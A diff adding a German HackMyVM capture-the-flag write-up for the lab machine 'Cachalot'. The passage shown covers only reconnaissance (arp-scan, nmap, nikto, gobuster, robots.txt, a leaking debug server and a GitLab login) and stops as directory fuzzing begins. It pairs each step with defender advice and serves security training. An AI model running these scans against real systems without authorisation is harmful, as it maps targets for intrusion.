@@ -1,1 +1,2298 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Cachalot - HackMyVM - Medium.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cachalot - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Cachalot - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2> <!-- CSS steuert die Farbe (Gelb) -->
+            <div class="circle medium"> <!-- Klasse 'medium' für CSS-Steuerung der Segmentfarben (Gelb) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- CSS steuert die Hintergrundfarbe (Header-Farbe) -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">jq</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">Metasploit</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">Wappalyzer</div>
+                <div class="tool-item">CyberChef</div>
+                <div class="tool-item">Burpsuite</div>
+                <div class="tool-item">docker</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                **Analyse:** Wie bei jedem initialen Test beginne ich mit der Netzwerkerkennung, um die IP-Adresse des Zielsystems zu ermitteln. Ich nutze den Befehl `arp-scan -l`, um eine Liste der aktiven Hosts im lokalen Netzwerk zu erhalten. Die Ausgabe pipe ich an `grep "PCS"`, um nach Zeilen zu filtern, die auf VirtualBox-Netzwerkkarten hindeuten ("PCS Systemtechnik"). Anschließend verwende ich `awk '{print $1}'`, um die erste Spalte (die IP-Adresse) aus der gefilterten Ausgabe zu extrahieren.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der `arp-scan` war schnell und effizient und lieferte umgehend die IP-Adresse des Zielsystems: 192.168.2.215. Die Identifizierung der Virtualisierungsplattform ist für den Kontext des Tests nützlich.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Beginnen Sie lokale Netzwerktests stets mit einem schnellen Discovery-Scan wie `arp-scan`, um die Ziel-IP(s) zu identifizieren.
+                <br>**Empfehlung (Admin):** Überwachen Sie Ihr Netzwerk auf unerwarteten ARP-Traffic. Nutzen Sie Netzwerksegmentierung, um die Reichweite solcher Discovery-Scans zu begrenzen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.215</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Um die weitere Arbeit mit dem Zielsystem zu vereinfachen, füge ich einen Eintrag für die gefundene IP-Adresse (192.168.2.215) und den erwarteten Hostnamen `cachalot.hmv` zu meiner lokalen `/etc/hosts` Datei hinzu. Dies ermöglicht mir, den Hostnamen anstelle der IP-Adresse in meinen Befehlen zu verwenden. Ich nutze den `echo`-Befehl mit Umleitung (`>>`) um die Zeile direkt anzuhängen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Hinzufügen des Ziels zur hosts-Datei ist ein einfacher, aber effektiver Schritt, der den Workflow während des Tests verbessert. Es hat keine Auswirkungen auf die Sicherheit des Zielsystems selbst, optimiert aber die Handhabung der Befehle auf meiner Angreifer-Maschine.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Passen Sie Ihre hosts-Datei frühzeitig an, um die Lesbarkeit und Handhabung der Befehle zu verbessern.
+                <br>**Empfehlung (Admin):** Dieser Schritt betrifft nur die Angreifer-Maschine. Für das Zielsystem irrelevant.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">echo '192.168.2.215      cachalot.hmv' &gt;&gt; /etc/hosts</span></div>
+                </div>
+                <div class="terminal"><pre></pre></div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nun führe ich einen umfassenden Portscan auf dem Zielsystem (192.168.2.215) mit Nmap durch. Ich verwende die Optionen `-sS` (SYN-Scan), `-sC` (Standard-Skripte), `-sV` (Versionserkennung), `-p-` (Scan aller 65535 Ports), `-T5` (aggressives Timing) und `-AO` (OS-Erkennung und alle Skripte). Der Scan liefert eine detaillierte Liste aller offenen Ports und der darauf laufenden Dienste.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser Nmap-Scan lieferte eine sehr interessante und umfangreiche Liste offener Ports: 22 (SSH), 80 (HTTP), 3000 (HTTP), 5022 (SSH), 5080 (HTTP), 8080 (HTTP), 9000 (HTTP). Dies deutet auf eine komplexere Umgebung hin, wahrscheinlich mit Containern oder verschiedenen Diensten, die auf ungewöhnlichen Ports laufen. Besonders hervorzuheben sind die zwei SSH-Dienste auf unterschiedlichen Ports (22 und 5022) mit unterschiedlichen Versionen und Hostkeys, sowie mehrere HTTP-Dienste (80 Apache, 3000 Grafana, 5080 nginx/GitLab, 8080 BaseHTTPServer, 9000 Golang/Docker UI). Dies gibt mir viele potenzielle Angriffsflächen, die ich nun detailliert untersuchen werde.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Führen Sie immer einen vollständigen Portscan (`-p-`) durch, um versteckte Dienste auf hohen Ports nicht zu übersehen. Analysieren Sie jeden offenen Port einzeln mit spezifischen Tools (z.B. Web-Scanner für HTTP-Ports, SSH-Scanner für SSH-Ports).
+                <br>**Empfehlung (Admin):** Minimieren Sie die Anzahl offener Ports. Deaktivieren Sie alle Dienste, die nicht unbedingt benötigt werden. Überprüfen Sie die Konfiguration von Diensten auf nicht-standardmäßigen Ports. Implementieren Sie eine Firewall, die nur benötigten Traffic erlaubt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.215</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 22:31 CEST</span>
+Nmap scan report for cachalot.hmv (192.168.2.215)
+<span class="password">Host is up (0.00022s latency).</span>
+Not shown: 65528 closed tcp <span class="command">ports</span> (reset)
+<span class="command">PORT     STATE SERVICE VERSION</span>
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">3072 ba:18:19:f5:08:d0:4d:8a:b2:94:17:79:4c:1e:c4:47 (RSA)</span>
+|   <span class="command">256 3e:e8:74:93:18:86:75:82:3d:6b:e6:da:34:b8:7e:2b (ECDSA)</span>
+<span class="command">|_  256 81:5c:cf:9f:74:c7:5d:8d:b5:7b:05:76:76:b1:5c:2b (ED25519)</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span>
+<span class="command">|_http-server-header: Apache/2.4.54 (Debian)</span>
+<span class="command">|_http-title: Cachalot</span>
+<span class="command">3000/tcp open  http    Grafana http</span>
+<span class="command">| http-robots.txt: 1 disallowed entry</span>
+<span class="command">|_/</span>
+<span class="command">|_http-trane-info: Problem with XML parsing of /evox/about</span>
+<span class="command">| http-title: Grafana</span>
+<span class="command">|_Requested resource was /login</span>
+<span class="command">5022/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 dc:b0:80:64:72:f0:f1:5b:e4:16:0e:d6:02:92:e7:7a (RSA)</span>
+|   <span class="command">256 cc:16:14:b9:d2:93:a6:2f:f7:36:a0:d9:56:e3:05:8e (ECDSA)</span>
+<span class="command">|_  256 a2:cc:cf:92:29:b9:76:fb:70:2e:c7:9e:2e:60:42:7d (ED25519)</span>
+<span class="command">5080/tcp open  http    nginx</span>
+<span class="command">|_http-trane-info: Problem with XML parsing of /evox/about</span>
+<span class="command">| http-title: Sign in \xC2\xB7 GitLab</span>
+<span class="command">|_Requested resource was http://cachalot.hmv:5080/users/sign_in</span>
+<span class="command">| http-robots.txt: 53 disallowed entries (15 shown)</span>
+<span class="command">| / /autocomplete/users /search /api /admin /profile</span>
+<span class="command">| /dashboard /projects/new /groups/new /groups/*/edit /users /help</span>
+<span class="command">|_/s/ /snippets/new /snippets/*/edit</span>
+<span class="command">8080/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.10)</span>
+<span class="command">|_http-trane-info: Problem with XML parsing of /evox/about</span>
+<span class="command">|_http-server-header: BaseHTTP/0.3 Python/2.7.10</span>
+<span class="command">|_http-title: Debug Server</span>
+<span class="command">9000/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span>
+<span class="command">|_http-title: containers | docker web-ui</span>
+<span class="command">MAC Address: 08:00:27:BE:A3:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Aggressive OS guesses: OpenWrt 21.02 (Linux 5.4) (96%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (96%), Linux 4.15 - 5.19 (96%), Linux 6.0 (96%), Linux 4.19 (95%), Linux 5.0 - 5.14 (94%), Linux 5.4 - 5.10 (93%), Linux 2.6.32 (93%), Linux 4.15 (93%), Linux 4.19 - 5.15 (93%)</span>
+<span class="command">No exact OS matches for host (test conditions non-ideal).</span>
+Network Distance: 1 hop
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.22 ms cachalot.hmv (192.168.2.215)</span>
+
+<span class="password">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 16.43 seconds</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Um spezifische Web-Schwachstellen auf dem primären Webserver auf Port 80 zu finden, setze ich den Webscanner Nikto ein. Der Befehl `nikto -h http://192.168.2.215` richtet den Scan auf das Ziel.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Nikto identifizierte auf Port 80 mehrere übliche Webserver-Konfigurationsprobleme, darunter fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`), mögliche Inode-Lecks über ETags und das Vorhandensein des Apache-Webserver-Handbuchs (`/manual/`) mit aktiviertem Directory Indexing in `/manual/images/`. Diese sind wichtige Hinweise auf unzureichende Härtung des Webservers, auch wenn sie nicht unbedingt zu RCE führen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfen Sie die öffentlich zugänglichen Verzeichnisse wie `/manual/images/` auf sensible Dateien. Die fehlenden Sicherheits-Header sollten im Bericht dokumentiert werden.
+                <br>**Empfehlung (Admin):** Entfernen Sie das Webserver-Handbuch und alle unnötigen Dateien aus dem Webroot. Deaktivieren Sie Directory Indexing. Implementieren Sie die empfohlenen Sicherheits-Header.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nikto -h http://192.168.2.215</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.215</span>
+<span class="command">+ Target Hostname:    192.168.2.215</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-06 22:31:44 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: Apache/2.4.54 (Debian)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+<span class="password">+ /: Server may leak inodes via ETags, header found with file /, inode: 164, size: 5e2ec7bfeab00, mtime: gzip. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
+<span class="command">+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .</span>
+<span class="password">+ /manual/: Web server manual found.</span>
+<span class="password">+ /manual/images/: Directory indexing found.</span>
+<span class="password">+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-06 22:31:59 (GMT2) (15 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="password">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich setze Gobuster ein, um Verzeichnisse und Dateien auf dem Webserver auf Port 80 zu finden. Ich verwende die Standard-Wordlist, erweitere sie mit einer Vielzahl von Dateierweiterungen (`-x txt,php,...`) und schließe bestimmte Fehlercodes aus (`-b '503,404,403'`). Die Option `-e` erweitert den Modus und `--no-error -k` unterdrückt Fehler und ignoriert SSL-Fehler (obwohl hier kein SSL verwendet wird).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Gobuster bestätigte die Existenz von `/index.html` und `/manual`, Letzteres als Weiterleitung (301) auf `/manual/`. Es fand auch `/background.png`. Diese Ergebnisse ergänzen die Nikto-Funde und bestätigen die Struktur des Webroots auf Port 80. Es wurden keine weiteren unerwarteten Verzeichnisse oder Dateien auf diesem Port gefunden, die sofort ins Auge stechen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Kombinieren Sie immer verschiedene Tools (Nikto, Gobuster/Feroxbuster) für die Web-Enumeration, da sie unterschiedliche Stärken haben und unterschiedliche Ergebnisse liefern können.
+                <br>**Empfehlung (Admin):** Entfernen Sie nicht benötigte Dateien und Verzeichnisse aus dem Webroot. Konfigurieren Sie den Webserver so, dass er keine Verzeichnisslistings anzeigt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">gobuster dir -u "http://cachalot.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt" -x txt,php,rar....s.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">===============================================================</span>
+<span class="command">Gobuster v3.6</span>
+<span class="command">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
+<span class="password">===============================================================</span>
+<span class="command">[+] Url:                     http://cachalot.hmv</span>
+<span class="command">[+] Method:                  GET</span>
+<span class="command">[+] Threads:                 10</span>
+<span class="command">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
+<span class="command">[+] Negative Status codes:   503,404,403</span>
+<span class="command">[+] User Agent:              gobuster/3.6</span>
+<span class="command">[+] Extensions:              mod,csv,svg,java,gz,conf,deb,phtml,pub,asp,accdb...</span>
+<span class="command">[+] Expanded:                true</span>
+<span class="command">[+] Timeout:                 10s</span>
+<span class="password">===============================================================</span>
+<span class="password">Starting gobuster in directory enumeration mode</span>
+<span class="password">===============================================================</span>
+<span class="command">http://cachalot.hmv/index.html           (Status: 200) [Size: 356]</span>
+<span class="command">http://cachalot.hmv/manual               (Status: 301) [Size: 313] [--&gt; http://cachalot.hmv/manual/]</span>
+<span class="command">http://cachalot.hmv/background.png       (Status: 200) [Size: 667992]</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich habe eine manuelle Verbindung zum HTTP-Dienst auf Port 8080 hergestellt und dokumentiere den Inhalt der Seite. Basierend auf dem Nmap-Scan ist dies ein `BaseHTTPServer 0.3 (Python 2.7.10)` mit dem Titel "Debug Server". Die Ausgabe zeigt Systeminformationen wie die interne IP-Adresse (`172.17.0.5`), Hostnamen (`35730cbdf3f1`), Home-Verzeichnis (`/root`) und PATH.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Dienst auf Port 8080 ist äußerst interessant. Die Bezeichnung "Debug Server" und die preisgegebenen Systeminformationen deuten auf eine nicht-produktive Umgebung hin, die möglicherweise weniger gehärtet ist. Die interne IP-Adresse (`172.17.0.5`) ist typisch für eine Docker-Umgebung (Standard-Bridge-Netzwerk), was die Ergebnisse des Nmap-Scans, der einen Docker Web UI auf Port 9000 vermutete, untermauert. Das Root-Verzeichnis `/root` und der PATH werden preisgegeben. Dies ist ein wertvoller Fund.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie diesen Debug-Server weiter. Gibt es weitere Endpunkte? Gibt es die Möglichkeit, Befehle auszuführen oder Dateien zu lesen/schreiben? Die Tatsache, dass er in einem Docker-Container läuft, bedeutet, dass Angriffe auf den Host über diesen Dienst schwieriger sein könnten (Container-Ausbruch nötig).
+                <br>**Empfehlung (Admin):** Stellen Sie niemals Debug-Dienste oder interne APIs ungeschützt im Netzwerk bereit. Wenn absolut notwendig, beschränken Sie den Zugriff streng (Firewall-Regeln, Authentifizierung). Geben Sie niemals unnötige Systeminformationen über Webdienste preis.
+            </p>
+            <p>
+                Untersuchung des Debug-Servers auf Port 8080:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:8080/</span>
+
+<span class="command">172.17.0.5  Booted: 9m 45s ago</span>
+
+<span class="command">HOME</span>
+    <span class="command">/root</span>
+<span class="command">HOSTNAME</span>
+    <span class="command">35730cbdf3f1</span>
+<span class="command">PATH</span>
+    <span class="command">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich wiederhole hier die Ausgabe des Nmap-Scans, um eine schnelle Referenz auf alle offenen Ports und die identifizierten Dienste zu haben, da die Enumeration nun auf mehrere Ports abzielt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Wiederholung dient dazu, die Komplexität des Ziels zu unterstreichen und die Vielfalt der Dienste zu visualisieren, die als Angriffsvektoren dienen könnten. Jeder gelistete Dienst (SSH, Apache, Grafana, nginx, GitLab, Python Debug Server, Docker UI) muss einzeln und in Kombination mit anderen Diensten analysiert werden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Behalten Sie eine Übersicht über alle gefundenen Dienste. Priorisieren Sie die Ports und Dienste basierend auf ihren bekannten Schwachstellen und ihrer Komplexität (z.B. Webanwendungen sind oft gute erste Ziele).
+                <br>**Empfehlung (Admin):** Eine klare Dokumentation aller laufenden Dienste und ihrer Zwecke ist essentiell für die Systemverwaltung und Sicherheit.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.215 |grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span>
+<span class="command">3000/tcp open  http    Grafana http</span>
+<span class="command">5022/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">5080/tcp open  http    nginx</span>
+<span class="command">8080/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.10)</span>
+<span class="command">9000/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich navigiere im Browser zur Adresse `http://192.168.2.215:5080/users/sign_in`, basierend auf der Nmap-Ausgabe, die einen GitLab-Login auf diesem Port vermutete. Das Bild im Bericht zeigt die Login-Seite von GitLab.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Bestätigung einer laufenden GitLab-Instanz ist sehr bedeutend. GitLab ist eine komplexe Anwendung, die in der Vergangenheit mehrere kritische Schwachstellen aufwies (insbesondere RCE). Die Version 11.4.7 wurde von Nmap und später Wappalyzer identifiziert. Dies ist eine spezifische Version, die ich auf bekannte Exploits untersuchen werde. Da es sich um eine Login-Seite handelt, ist Authentifizierung für die meisten Funktionen (und Exploits) erforderlich.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Suchen Sie nach öffentlichen Exploits oder bekannten Schwachstellen für GitLab Version 11.4.7. Versuchen Sie, Anmeldedaten (Standard-Anmeldedaten, durch andere Mittel kompromittierte Daten) für die GitLab-Instanz zu finden. Die Analyse der `phpinfo` für den Backdoor Header im Blackhat-Bericht hat gezeigt, wie wichtig es ist, jede Information zu nutzen. Hier werde ich nach Anmeldedaten suchen.
+                <br>**Empfehlung (Admin):** Aktualisieren Sie GitLab auf eine nicht anfällige Version. Stellen Sie sicher, dass die Standard-Anmeldedaten geändert wurden. Implementieren Sie Multi-Faktor-Authentifizierung, wo möglich.
+            </p>
+            <p>
+                Zugriff auf die GitLab-Login-Seite auf Port 5080:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:5080/users/sign_in</span>
+</pre>
+            <img src="gitlab_login.jpg" alt="hier auf dem Bild sieht man die Gitlab login Webseite">
+            <p class="analysis">Bildbeschreibung: hier auf dem Bild sieht man die Gitlab login Webseite</p>
+
+            <p class="analysis">
+                **Analyse:** Ich betrachte die `robots.txt` Datei für die GitLab-Instanz auf Port 5080. Diese Datei gibt Suchmaschinen-Crawlern Anweisungen, welche Bereiche der Website nicht indiziert werden sollen. Oft enthält sie Pfade zu sensiblen Bereichen, die für einen Angreifer interessant sein könnten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die `robots.txt` für GitLab ist sehr umfangreich und listet viele Pfade auf, die Suchmaschinen meiden sollen (`Disallow:`). Dazu gehören `/admin`, `/profile`, `/dashboard`, `/projects/new`, `/groups/new`, `/users`, `/api` und viele mehr. Diese Liste liefert wertvolle Informationen über die Struktur der GitLab-Anwendung und interessante Endpunkte, die ich später als authentifizierter Benutzer untersuchen könnte. Die Tatsache, dass einige `robots.txt` Einträge, die eigentlich gesperrt sein sollten (z.B. `/users/sign_in/`, `/search/`, `/help/`), mit Status 200 antworten, ist ein kleiner Hinweis, aber nicht kritisch für die Sicherheit selbst.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfen Sie immer die `robots.txt` Datei auf Webservern. Sie kann wertvolle Informationen über versteckte oder sensible Pfade preisgeben, die manuell oder mit Fuzzing-Tools untersucht werden sollten.
+                <br>**Empfehlung (Admin):** Veröffentlichen Sie nur die minimal benötigten Informationen in `robots.txt`. Beachten Sie, dass dies keine Sicherheitsmaßnahme ist, sondern nur eine Richtlinie für Crawler.
+            </p>
+            <p>
+                Analyse der `robots.txt` Datei für die GitLab-Instanz:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:5080/robots.txt</span>
+
+# See [Link: http://www.robotstxt.org/robotstxt.html | Ziel: http://www.robotstxt.org/robotstxt.html] for documentation on how to use the robots.txt file
+#
+# To ban all spiders from the entire site uncomment the next two lines:
+# User-Agent: *
+# Disallow: /
+
+# Add a 1 second delay between successive requests to the same server, limits resources used by crawler
+# Only some crawlers respect this setting, e.g. Googlebot does not
+# Crawl-delay: 1
+
+# Based on details in [Link: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb | Ziel: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb], [Link: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing | Ziel: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing], and using application
+<span class="command">User-Agent: *</span>
+<span class="command">Disallow: /autocomplete/users</span>
+<span class="command">Disallow: /search</span>
+<span class="command">Disallow: /api</span>
+<span class="command">Disallow: /admin</span>
+<span class="command">Disallow: /profile</span>
+<span class="command">Disallow: /dashboard</span>
+<span class="command">Disallow: /projects/new</span>
+<span class="command">Disallow: /groups/new</span>
+<span class="command">Disallow: /groups/*/edit</span>
+<span class="command">Disallow: /users</span>
+<span class="command">Disallow: /help</span>
+# Only specifically allow the Sign In page to avoid very ugly search results
+<span class="command">Allow: /users/sign_in</span>
+
+# Global snippets
+<span class="command">User-Agent: *</span>
+<span class="command">Disallow: /s/</span>
+<span class="command">Disallow: /snippets/new</span>
+<span class="command">Disallow: /snippets/*/edit</span>
+<span class="command">Disallow: /snippets/*/raw</span>
+
+# Project details
+<span class="command">User-Agent: *</span>
+<span class="command">Disallow: /*/*.git</span>
+<span class="command">Disallow: /*/*/fork/new</span>
+<span class="command">Disallow: /*/*/repository/archive*</span>
+<span class="command">Disallow: /*/*/activity</span>
+<span class="command">Disallow: /*/*/new</span>
+<span class="command">Disallow: /*/*/edit</span>
+<span class="command">Disallow: /*/*/raw</span>
+<span class="command">Disallow: /*/*/blame</span>
+<span class="command">Disallow: /*/*/commits/*/*</span>
+<span class="command">Disallow: /*/*/commit/*.patch</span>
+<span class="command">Disallow: /*/*/commit/*.diff</span>
+<span class="command">Disallow: /*/*/compare</span>
+<span class="command">Disallow: /*/*/branches/new</span>
+<span class="command">Disallow: /*/*/tags/new</span>
+<span class="command">Disallow: /*/*/network</span>
+<span class="command">Disallow: /*/*/graphs</span>
+<span class="command">Disallow: /*/*/milestones/new</span>
+<span class="command">Disallow: /*/*/milestones/*/edit</span>
+<span class="command">Disallow: /*/*/issues/new</span>
+<span class="command">Disallow: /*/*/issues/*/edit</span>
+<span class="command">Disallow: /*/*/merge_requests/new</span>
+<span class="command">Disallow: /*/*/merge_requests/*.patch</span>
+<span class="command">Disallow: /*/*/merge_requests/*.diff</span>
+<span class="command">Disallow: /*/*/merge_requests/*/edit</span>
+<span class="command">Disallow: /*/*/merge_requests/*/diffs</span>
+<span class="command">Disallow: /*/*/project_members/import</span>
+<span class="command">Disallow: /*/*/labels/new</span>
+<span class="command">Disallow: /*/*/labels/*/edit</span>
+<span class="command">Disallow: /*/*/wikis/*/edit</span>
+<span class="command">Disallow: /*/*/snippets/new</span>
+<span class="command">Disallow: /*/*/snippets/*/edit</span>
+<span class="command">Disallow: /*/*/snippets/*/raw</span>
+<span class="command">Disallow: /*/*/deploy_keys</span>
+<span class="command">Disallow: /*/*/hooks</span>
+<span class="command">Disallow: /*/*/services</span>
+<span class="command">Disallow: /*/*/protected_branches</span>
+<span class="command">Disallow: /*/*/uploads/</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich setze Feroxbuster ein, um Verzeichnisse und Dateien auf der GitLab-Instanz auf Port 5080 zu enumerieren. Ich verwende die Standard-Wordlist, füge relevante Dateierweiterungen hinzu und filtere die Ergebnisse auf Statuscodes 200, 301, 302.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Feroxbuster fand zahlreiche Pfade auf Port 5080. Viele der Treffer sind Standard-GitLab-Ressourcen (CSS, JS, HTML-Seiten wie 422.html, 503.html, explore.html) oder API-Endpunkte (z.B. `/users/root/snippets.json`). Interessant ist das Listing von Pfaden, die mit `/users/root/` beginnen (z.B. `/users/root/snippets`, `/users/root/activity`, `/users/root/projects`). Obwohl dies standardmäßige GitLab-Endpunkte sind, deuten sie auf die Existenz eines Benutzers "root" hin und geben Einblick in dessen Aktivitäten und Projekte, falls ich mich authentifizieren kann. Die Umleitung von `/users/root/` zu `/root` ist ebenfalls notiert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Analysieren Sie die gefundenen Endpunkte, insbesondere die API-Endpunkte, auf potenzielle Informationslecks oder Schwachstellen. Konzentrieren Sie sich auf den Benutzer "root" in GitLab.
+                <br>**Empfehlung (Admin):** Minimieren Sie die über das Web zugänglichen Endpunkte und sichern Sie API-Zugriffe streng ab. Stellen Sie sicher, dass Benutzerprofile (auch für den Root-Benutzer) keine unnötigen Informationen preisgeben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
